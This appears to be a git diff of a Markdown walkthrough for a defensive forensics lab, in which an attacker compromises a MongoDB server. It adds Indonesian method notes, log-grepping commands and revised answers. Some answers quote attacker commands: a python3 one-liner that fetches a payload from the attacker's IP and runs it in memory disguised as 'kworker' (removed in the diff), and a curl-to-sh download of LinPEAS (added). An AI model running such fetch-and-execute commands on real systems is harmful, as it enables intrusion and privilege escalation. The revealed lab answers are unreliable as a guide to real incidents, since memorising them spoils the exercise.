@@ -64,6 +64,11 @@ Perform a rapid triage analysis of the collected artifacts to determine whether 
 ### Task 4: Exploitation Start Time
 **Question:** 
 Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
+<img width="1024" height="63" alt="image" src="https://github.com/user-attachments/assets/258174cf-1854-48d0-af00-185f08c047d8" />
+* **Analysis:** Setelah mengetahui IP Attacker, untuk mengetahui kapan IP Attacker mulai menyerang bisa menggunakan command berikut
+```bash
+    cat mongod.log | grep 65.0.76.43 | head -10
+```
 <details>
 <summary>Click to see answer</summary>
 
@@ -71,32 +76,67 @@ Based on the MongoDB logs, determine the exact date and time the attacker’s ex
 </details>
 
 ### Task 5: Malicious Connections
-**Question:** Calculate the total number of malicious connections initiated by the attacker.
+**Question:** 
+Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.
+<img width="323" height="32" alt="image" src="https://github.com/user-attachments/assets/df0a36b5-886e-4a27-a5bb-167e54e68e3c" />
+* **Method:** Untuk memperkirakan jumlah serangan dari IP Attacker bisa menggunakan command `wc -l`
+```bash
+    cat mongod.log | grep 65.0.76.43 | wc -l
+```
 <details>
 <summary>Click to see answer</summary>
 
-**Answer:** `382`
+**Answer:** `75260`
 </details>
 
 ### Task 6: Remote Access Time
-**Question:** Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
+**Question:** 
+The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
+<img width="1031" height="87" alt="image" src="https://github.com/user-attachments/assets/e0f819d5-4707-4da2-b1b8-e0e85c8ae88b" />
+* **Method:** Analisis `auth.log` yang terletak di direktori `/[root]/var/log` untuk mengetahui kapan Attacker bisa mendapatkan remote access setelah melakukan brute force bisa dengan mengunnakan command : 
+```bash
+    cat auth.log | grep 65.0.76.43
+```
 <details>
 <summary>Click to see answer</summary>
-
+    
 **Answer:** `2025-12-29 05:40:03`
-**Method:** Analyzed `auth.log` for successful SSH logins from the malicious IP.
 </details>
 
 ### Task 7: Malicious Command
-**Question:** Identify the exact command line the attacker used to execute an in‑memory script.
+**Question:** 
+Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
+<br/><img width="671" height="108" alt="image" src="https://github.com/user-attachments/assets/96c52323-87d9-48f5-b58f-fd0e60ff7877" />
+* **Method:** Analisis `.bash_history` yang terletak di direktori `/[root]/home/mongoadmin` untuk mengetahui command apa yang dieksekusi attacker untuk mencoba privillage escalation 
+```bash
+    cat .bash_history 
+```
 <details>
 <summary>Click to see answer</summary>
 
 **Answer:**
 ```bash
-python3 -c 'import os,sys,urllib.request;import ctypes;M=ctypes.CDLL(None);M.syscall.restype=ctypes.c_int;fd=M.syscall(319,b"",1);m=open(fd,"wb");m.write(urllib.request.urlopen("[http://65.0.76.43:8000/lin](http://65.0.76.43:8000/lin)").read());m.close();os.execv(f"/proc/self/fd/{fd}",["kworker"])'
+    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 ```
 </details>
+
+### Task 8: Locate Directory
+**Question:** 
+The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
+<br/><img width="668" height="285" alt="image" src="https://github.com/user-attachments/assets/d9f795d6-16a5-43fc-b03a-00c18428b003" />
+* **Method:** Analisis `.bash_history` yang terletak di direktori `/[root]/home/mongoadmin` untuk mengetahui di direktory mana attacker membuka Python web server
+```bash
+    cat .bash_history 
+```
+<details>
+<summary>Click to see answer</summary>
+
+**Answer:**
+```bash
+    /var/lib/mongodb
+```
+</details>
+
 
 ---
 ## 🛡️ Incident Summary & Mitigation
